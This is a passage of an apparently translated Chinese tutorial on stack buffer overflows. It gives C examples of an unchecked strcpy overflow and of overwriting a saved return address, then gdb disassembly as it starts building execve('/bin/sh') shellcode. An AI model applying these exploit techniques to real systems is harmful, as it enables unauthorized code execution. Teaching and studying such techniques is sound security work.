缓冲区溢出<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp; 缓冲区溢出是向一个缓冲区填充超过它处理能力的数据所造成的结果. 如何利用这个<BR>经常出现的编程错误来执行任意代码呢? 让我们来看看另一个例子:<BR><BR>example2.c<BR>------------------------------------------------------------------------------<BR>void function(char *str) {<BR>&nbsp;&nbsp; char buffer[16];<BR><BR>&nbsp;&nbsp; strcpy(buffer,str);<BR>}<BR><BR>void main() {<BR>&nbsp; char large_string[256];<BR>&nbsp; int i;<BR><BR>&nbsp; for( i = 0; i &lt; 255; i++)<BR>&nbsp;&nbsp;&nbsp; large_string[i] = 'A';<BR><BR>&nbsp; function(large_string);<BR>}<BR>------------------------------------------------------------------------------<BR> <BR>&nbsp;&nbsp;&nbsp; 这个程序的函数含有一个典型的内存缓冲区编码错误. 该函数没有进行边界检查就复<BR>制提供的字符串, 错误地使用了strcpy()而没有使用strncpy(). 如果你运行这个程序就<BR>会产生段错误. 让我们看看在调用函数时堆栈的模样:<BR><BR>内存低地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 内存高地址<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; *str<BR>&lt;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ]&nbsp;&nbsp; <BR><BR>堆栈顶部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR><BR>&nbsp;&nbsp;&nbsp; 这里发生了什么事? 为什么我们得到一个段错误? 答案很简单: strcpy()将*str的<BR>内容(larger_string[])复制到buffer[]里, 直到在字符串中碰到一个空字符. 显然, <BR>buffer[]比*str小很多. buffer[]只有16个字节长, 而我们却试图向里面填入256个字节<BR>的内容. 这意味着在buffer之后, 堆栈中250个字节全被覆盖. 包括SFP, RET, 甚至*str!<BR>我们已经把large_string全都填成了A. A的十六进制值为0x41. 这意味着现在的返回地<BR>址是0x41414141. 这已经在进程的地址空间之外了. 当函数返回时, 程序试图读取返回<BR>地址的下一个指令, 此时我们就得到一个段错误.<BR><BR>&nbsp;&nbsp;&nbsp; 因此缓冲区溢出允许我们更改函数的返回地址. 这样我们就可以改变程序的执行流程.<BR>现在回到第一个例子, 回忆当时堆栈的模样: <BR><BR>内存低地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 内存高地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer1&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp; b&nbsp;&nbsp;&nbsp;&nbsp; c<BR>&lt;------&nbsp;&nbsp; [&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>堆栈顶部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR><BR>&nbsp;&nbsp;&nbsp; 现在试着修改我们第一个例子, 让它可以覆盖返回地址, 而且使它可以执行任意代码.<BR>堆栈中在buffer1[]之前的是SFP, SFP之前是返回地址. ret从buffer1[]的结尾算起是4个<BR>字节.应该记住的是buffer1[]实际上是2个字即8个字节长. 因此返回地址从buffer1[]的开<BR>头算起是12个字节. 我们会使用这种方法修改返回地址, 跳过函数调用后面的赋值语句<BR>'x=1;', 为了做到这一点我们把返回地址加上8个字节. 代码看起来是这样的:<BR><BR>example3.c:<BR>------------------------------------------------------------------------------<BR>void function(int a, int b, int c) {<BR>&nbsp;&nbsp; char buffer1[5];<BR>&nbsp;&nbsp; char buffer2[10];<BR>&nbsp;&nbsp; int *ret;<BR><BR>&nbsp;&nbsp; ret = buffer1 + 12;<BR>&nbsp;&nbsp; (*ret) += 8;<BR>}<BR><BR>void main() {<BR>&nbsp; int x;<BR><BR>&nbsp; x = 0;<BR>&nbsp; function(1,2,3);<BR>&nbsp; x = 1;<BR>&nbsp; printf("%d\n",x);<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 我们把buffer1[]的地址加上12, 所得的新地址是返回地址储存的地方. 我们想跳过<BR>赋值语句而直接执行printf调用. 如何知道应该给返回地址加8个字节呢? 我们先前使用<BR>过一个试验值(比如1), 编译该程序, 祭出工具gdb:<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ gdb example3<BR>GDB is free software and you are welcome to distribute copies of it<BR> under certain conditions; type "show copying" to see the conditions.<BR>There is absolutely no warranty for GDB; type "show warranty" for details.<BR>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...<BR>(no debugging symbols found)...<BR>(gdb) disassemble main<BR>Dump of assembler code for function main:<BR>0x8000490 &lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x8000491 &lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp<BR>0x8000493 &lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp; subl&nbsp;&nbsp; $0x4,%esp<BR>0x8000496 &lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xfffffffc(%ebp)<BR>0x800049d &lt;main+13&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x3<BR>0x800049f &lt;main+15&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x2<BR>0x80004a1 &lt;main+17&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x1<BR>0x80004a3 &lt;main+19&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x8000470 &lt;function&gt;<BR>0x80004a8 &lt;main+24&gt;:&nbsp;&nbsp;&nbsp; addl&nbsp;&nbsp; $0xc,%esp<BR>0x80004ab &lt;main+27&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1,0xfffffffc(%ebp)<BR>0x80004b2 &lt;main+34&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0xfffffffc(%ebp),%eax<BR>0x80004b5 &lt;main+37&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %eax<BR>0x80004b6 &lt;main+38&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x80004f8<BR>0x80004bb &lt;main+43&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x8000378 &lt;printf&gt;<BR>0x80004c0 &lt;main+48&gt;:&nbsp;&nbsp;&nbsp; addl&nbsp;&nbsp; $0x8,%esp<BR>0x80004c3 &lt;main+51&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebp,%esp<BR>0x80004c5 &lt;main+53&gt;:&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %ebp<BR>0x80004c6 &lt;main+54&gt;:&nbsp;&nbsp;&nbsp; ret<BR>0x80004c7 &lt;main+55&gt;:&nbsp;&nbsp;&nbsp; nop<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 我们看到当调用function()时, RET会是0x8004a8, 我们希望跳过在0x80004ab的赋值<BR>指令. 下一个想要执行的指令在0x8004b2. 简单的计算告诉我们两个指令的距离为8字节.<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Shell Code<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp; 现在我们可以修改返回地址即可以改变程序执行的流程, 我们想要执行什么程序呢?<BR>在大多数情况下我们只是希望程序派生出一个shell. 从这个shell中, 可以执行任何我<BR>们所希望的命令. 但是如果我们试图破解的程序里并没有这样的代码可怎么办呢? 我们<BR>怎么样才能将任意指令放到程序的地址空间中去呢? 答案就是把想要执行的代码放到我<BR>们想使其溢出的缓冲区里, 并且覆盖函数的返回地址, 使其指向这个缓冲区. 假定堆栈<BR>的起始地址为0xFF, S代表我们想要执行的代码, 堆栈看起来应该是这样:<BR><BR>内存低&nbsp;&nbsp;&nbsp;&nbsp; DDDDDDDDEEEEEEEEEEEE&nbsp; EEEE&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp;&nbsp;&nbsp;&nbsp; 内存高<BR>地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 89ABCDEF0123456789AB&nbsp; CDEF&nbsp; 0123&nbsp; 4567&nbsp; 89AB&nbsp; CDEF&nbsp;&nbsp;&nbsp;&nbsp; 地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp; b&nbsp;&nbsp;&nbsp;&nbsp; c<BR><BR>&lt;------&nbsp;&nbsp; [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |____________________________|<BR>堆栈顶部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 派生出一个shell的C语言代码是这样的:<BR>&nbsp; <BR>shellcode.c<BR>-----------------------------------------------------------------------------<BR>#include &lt;stdio.h&gt;<BR><BR>void main() {<BR>&nbsp;&nbsp; char *name[2];<BR><BR>&nbsp;&nbsp; name[0] = "/bin/sh";<BR>&nbsp;&nbsp; name[1] = NULL;<BR>&nbsp;&nbsp; execve(name[0], name, NULL);<BR>}<BR>------------------------------------------------------------------------------<BR> <BR>&nbsp;&nbsp;&nbsp; 为了查明这程序变成汇编后是个什么样子, 我们编译它, 然后祭出调试工具gdb. 记住<BR>在编译的时候要使用-static标志, 否则系统调用execve的真实代码就不会包括在汇编中,<BR>取而代之的是对动态C语言库的一个引用, 真正的代码要到程序加载的时候才会联入.<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c<BR>[aleph1]$ gdb shellcode<BR>GDB is free software and you are welcome to distribute copies of it<BR> under certain conditions; type "show copying" to see the conditions.<BR>There is absolutely no warranty for GDB; type "show warranty" for details.<BR>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...<BR>(gdb) disassemble main<BR>Dump of assembler code for function main:<BR>0x8000130 &lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x8000131 &lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp<BR>0x8000133 &lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp; subl&nbsp;&nbsp; $0x8,%esp<BR>0x8000136 &lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x80027b8,0xfffffff8(%ebp)<BR>0x800013d &lt;main+13&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xfffffffc(%ebp)<BR>0x8000144 &lt;main+20&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x0<BR>0x8000146 &lt;main+22&gt;:&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xfffffff8(%ebp),%eax<BR>0x8000149 &lt;main+25&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %eax<BR>0x800014a &lt;main+26&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0xfffffff8(%ebp),%eax<BR>0x800014d &lt;main+29&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %eax<BR>0x800014e &lt;main+30&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x80002bc &lt;__execve&gt;<BR>0x8000153 &lt;main+35&gt;:&nbsp;&nbsp;&nbsp; addl&nbsp;&nbsp; $0xc,%esp<BR>0x8000156 &lt;main+38&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebp,%esp<BR>0x8000158 &lt;main+40&gt;:&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %ebp<BR>0x8000159 &lt;main+41&gt;:&nbsp;&nbsp;&nbsp; ret<BR>End of assembler dump.<BR>(gdb) disassemble __execve<BR>Dump of assembler code for function __execve:<BR>0x80002bc &lt;__execve&gt;:&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x80002bd &lt;__execve+1&gt;: movl&nbsp;&nbsp; %esp,%ebp<BR>0x80002bf &lt;__execve+3&gt;: pushl&nbsp; %ebx<BR>0x80002c0 &lt;__execve+4&gt;: movl&nbsp;&nbsp; $0xb,%eax<BR>0x80002c5 &lt;__execve+9&gt;: movl&nbsp;&nbsp; 0x8(%ebp),%ebx<BR>0x80002c8 &lt;__execve+12&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0xc(%ebp),%ecx<BR>0x80002cb &lt;__execve+15&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0x10(%ebp),%edx<BR>0x80002ce &lt;__execve+18&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>0x80002d0 &lt;__execve+20&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %eax,%edx<BR>0x80002d2 &lt;__execve+22&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; testl&nbsp; %edx,%edx<BR>0x80002d4 &lt;__execve+24&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jnl&nbsp;&nbsp;&nbsp; 0x80002e6 &lt;__execve+42&gt;<BR>0x80002d6 &lt;__execve+26&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; negl&nbsp;&nbsp; %edx<BR>0x80002d8 &lt;__execve+28&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %edx<BR>0x80002d9 &lt;__execve+29&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x8001a34 &lt;__normal_errno_location&gt;<BR>0x80002de &lt;__execve+34&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %edx<BR>0x80002df &lt;__execve+35&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %edx,(%eax)<BR>0x80002e1 &lt;__execve+37&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xffffffff,%eax<BR>0x80002e6 &lt;__execve+42&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %ebx<BR>0x80002e7 &lt;__execve+43&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebp,%esp<BR>0x80002e9 &lt;__execve+45&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %ebp<BR>0x80002ea &lt;__execve+46&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret<BR>0x80002eb &lt;__execve+47&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nop<BR>End of assembler dump.<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 下面我们看看这里究竟发生了什么事情. 先从main开始研究:<BR>&nbsp;&nbsp;&nbsp; <BR>------------------------------------------------------------------------------<BR>0x8000130 &lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x8000131 &lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp<BR>0x8000133 &lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp; subl&nbsp;&nbsp; $0x8,%esp<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这是例程的准备工作. 首先保存老的帧指针, 用当前的堆栈指针作为新的帧指针,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 然后为局部变量保留空间. 这里是:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char *name[2];<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 即2个指向字符串的指针. 指针的长度是一个字, 所以这里保留2个字(8个字节)的<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 空间.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x8000136 &lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x80027b8,0xfffffff8(%ebp)<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我们把0x80027b8(字串"/bin/sh"的地址)这个值复制到name[]中的第一个指针, 这<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 等价于:&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name[0] = "/bin/sh";<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x800013d &lt;main+13&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xfffffffc(%ebp)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我们把值0x0(NULL)复制到name[]中的第二个指针, 这等价于:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; name[1] = NULL;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 对execve()的真正调用从下面开始:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x8000144 &lt;main+20&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; $0x0<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我们把execve()的参数以从后向前的顺序压入堆栈中, 这里从NULL开始.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x8000146 &lt;main+22&gt;:&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xfffffff8(%ebp),%eax<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把name[]的地址放到EAX寄存器中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x8000149 &lt;main+25&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %eax<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 接着就把name[]的地址压入堆栈中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x800014a &lt;main+26&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; 0xfffffff8(%ebp),%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 把字串"/bin/sh"的地址放到EAX寄存器中<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x800014d &lt;main+29&gt;:&nbsp;&nbsp;&nbsp; pushl&nbsp; %eax<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 接着就把字串"/bin/sh"的地址压入堆栈中<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>0x800014e &lt;main+30&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x80002bc &lt;__execve&gt;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 调用库例程execve(). 